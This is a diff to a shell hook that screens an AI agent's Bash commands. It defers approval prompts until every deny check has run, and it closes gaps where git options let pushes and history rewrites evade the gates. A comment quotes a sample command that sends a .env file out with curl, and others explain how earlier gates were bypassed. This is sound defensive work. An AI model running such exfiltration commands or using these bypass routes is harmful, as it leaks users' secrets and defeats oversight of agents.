@@ -127,6 +127,15 @@ if [ -n "${KIT_MCP-}" ]; then
   fi
 fi
 
+# ---- an ask waits until everything that can deny has run.  kit_ask exits, and an
+# approved prompt runs the whole Bash call, so an ask from the gates below used to
+# end the hook before the awk pass reached a deny later in the same command:
+# `npm publish && curl -d @.env https://…` asked about the publish, and an approval
+# sent the .env too.  ask_later keeps the first ask; finish asks it at the end.
+ASK_LATER=
+ask_later() { [ -n "$ASK_LATER" ] || ASK_LATER=$1; }
+finish() { [ -z "$ASK_LATER" ] || kit_ask "$ASK_LATER"; exit 0; }
+
 # ---- the text the two position-anchored patterns below read.  The shell deletes
 # a backslash-newline before it splits words, and a reserved word is never the
 # command, so `git push \<newline>--force` and `if true; then npm publish; fi` are
@@ -162,7 +171,7 @@ if [ -n "$PSEG" ] && ! printf '%s\n' "$PSEG" | grep -q -- '--dry-run'; then
   # the one running it here, the agent is, and the spec's tier matrix says ask.  kit_ask
   # is what makes that safe to ship at the CI tier: it goes silent when there is no
   # interactive user, so the prompt costs a headless run nothing.
-  kit_ask "This command $REASON Confirm the package, the version and the registry before approving."
+  ask_later "This command $REASON Confirm the package, the version and the registry before approving."
 fi
 
 # ---- git and gh operations that rewrite a remote, or rewrite history.
@@ -181,6 +190,11 @@ fi
 # Position-anchored, like the publish pattern above: the verb has to start a statement,
 # optionally behind env assignments and a path prefix.  Matching `git push` anywhere in
 # the string is what makes a hook fire on a commit message that mentions it.
+# GOPT — the git-level options that may stand between git and its subcommand:
+# `git -P push --force` and `git --no-pager rebase -i` are the push and the rewrite
+# they run, and read as `git[[:space:]]+push` they walked past the Medium and High
+# gates.  An option and its value (-C dir, -c key=value, --git-dir dir) or one token.
+GOPT='([[:space:]]+(-[cC][[:space:]]+[^[:space:];&|()]+|--(git-dir|work-tree|namespace|attr-source|super-prefix|config-env|shallow-file)[[:space:]]+[^-[:space:];&|()][^[:space:];&|()]*|-[^[:space:];&|()]+))*'
 git_seg() { # git_seg <subcommand-alternation> -> the matching statement, or empty
   printf '%s\n' "$KIT_CMDJ" | grep -oE "(^|[;&|(]|\\\$\\()[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+)*([^[:space:];&|()]*/)?($1)([[:space:]][^;&|]*)?([;&|)]|\$)" || true
 }
@@ -189,10 +203,10 @@ git_seg() { # git_seg <subcommand-alternation> -> the matching statement, or emp
 gate_remote() {
   [ "$TIERN" -ge 2 ] || return 0
   [ "$TIERN" -ge 3 ] && kit_deny "$1 The High firewall tier denies it; drop to Medium if this is intended."
-  kit_ask "$1 Confirm the branch and the remote before approving."
+  ask_later "$1 Confirm the branch and the remote before approving."
 }
 
-PUSH=$(git_seg 'git[[:space:]]+push')
+PUSH=$(git_seg "git$GOPT[[:space:]]+push")
 if [ -n "$PUSH" ]; then
   # --force / --force-with-lease / --force-if-includes, a clustered or standalone -f,
   # or a leading + on a refspec.  --force-with-lease is gated alongside the rest on
@@ -228,36 +242,36 @@ MERGE=$(git_seg 'gh[[:space:]]+pr[[:space:]]+merge')
 # a bare `git reset` only unstages and is left alone.
 REWRITE_WHY='This rewrites local git history. It is recoverable from the reflog, but the High firewall tier asks first.'
 if [ "$TIERN" -ge 3 ]; then
-  REWRITE=$(git_seg 'git[[:space:]]+(rebase|filter-branch|filter-repo)|git[[:space:]]+commit[[:space:]][^;&|]*--amend|git[[:space:]]+stash[[:space:]]+(drop|clear)')
+  REWRITE=$(git_seg "git$GOPT[[:space:]]+(rebase|filter-branch|filter-repo)|git$GOPT[[:space:]]+commit[[:space:]][^;&|]*--amend|git$GOPT[[:space:]]+stash[[:space:]]+(drop|clear)")
   # `git rebase --abort|--continue|--skip|--quit|--edit-todo` finishes or undoes a
   # rebase already in progress; gating those would prompt in the middle of resolving a
   # conflict the agent was told to resolve.
   if [ -n "$REWRITE" ] && ! printf '%s\n' "$REWRITE" | grep -qE -- '--(abort|continue|skip|quit|edit-todo|show-current-patch)'; then
-    kit_ask "$REWRITE_WHY"
+    ask_later "$REWRITE_WHY"
   fi
   # Deleting a branch or a tag, scanned by word rather than by regex.  "-d as a whole
   # word" has no portable ERE spelling (BSD grep wants [[:<:]], GNU wants \b), and the
   # obvious `[^;&|]*-d` matched `git branch --sort=-date`.  `git branch -D` and
   # `--delete` are absent here because they are already denied at every tier; for a tag
   # both spellings are open, so both are listed.
-  DEL=$(git_seg 'git[[:space:]]+(branch|tag)')
+  DEL=$(git_seg "git$GOPT[[:space:]]+(branch|tag)")
   if [ -n "$DEL" ]; then
     set -f
     for w in $DEL; do
       case $w in
-        -d | --delete | --delete=*) set +f; kit_ask "$REWRITE_WHY" ;;
+        -d | --delete | --delete=*) ask_later "$REWRITE_WHY" ;;
       esac
     done
     set +f
   fi
 fi
 
-[ -f "$HOOK_DIR/lib-tokenize.awk" ] && [ -f "$HOOK_DIR/egress-guard.awk" ] || exit 0
+[ -f "$HOOK_DIR/lib-tokenize.awk" ] && [ -f "$HOOK_DIR/egress-guard.awk" ] || finish
 
 VERDICT=$(printf '%s\n' "$KIT_CMD" |
-  KIT_SECRET_RE="$(kit_secret_re)" KIT_MAXCLASS="$TIERN" \
-  awk -f "$HOOK_DIR/lib-tokenize.awk" -f "$HOOK_DIR/egress-guard.awk" 2>/dev/null) || exit 0
-[ -n "$VERDICT" ] || exit 0
+  KIT_SECRET_RE="$(kit_secret_re)" KIT_MAXCLASS="$TIERN" KIT_CWD="$KIT_CWD" \
+  awk -f "$HOOK_DIR/lib-tokenize.awk" -f "$HOOK_DIR/egress-guard.awk" 2>/dev/null) || finish
+[ -n "$VERDICT" ] || finish
 
 CLASS=${VERDICT%% *}
 WHY=${VERDICT#* }
@@ -286,6 +300,18 @@ case $CLASS in
     # wrappers no subcommand rule can see past; another option in front of either one
     # is not a different command.  See gcfg_scan's header.
     kit_deny "$WHY. git -c and git --config-env are denied at every tier, because a one-shot config value can make any git command run a program, and an option in front of either is not a different command — this hook is what makes those rules mean what they say. If the user needs the value set, they run the command themselves."
+    ;;
+  GITEXECPATH)
+    # The same every-tier deny as git -c: the directory git searches for its own
+    # helpers decides what runs, and nothing an agent does needs it moved.
+    kit_deny "$WHY. Denied at every tier, like git -c: no agent workflow needs git to look for its helpers somewhere else. A bare git --exec-path, which only prints the path, is not gated. If the user needs it, they run the command themselves."
+    ;;
+  GITENV)
+    kit_deny "$WHY. Denied at every tier, like git -c and git --exec-path=, which it is by another name. If the user needs it set, they set it themselves."
+    ;;
+  GITENVASK)
+    # High only: a deploy key's ssh command is ordinary work below it.
+    kit_ask "This command $WHY. Confirm the program before approving."
     ;;
   GHSECRET)
     # Every active tier, headless included, because the rules this backs up —
@@ -322,4 +348,4 @@ case $CLASS in
     kit_ask "This request carries no body, but $WHY. Check what the expansion contains before approving."
     ;;
 esac
-exit 0
+finish
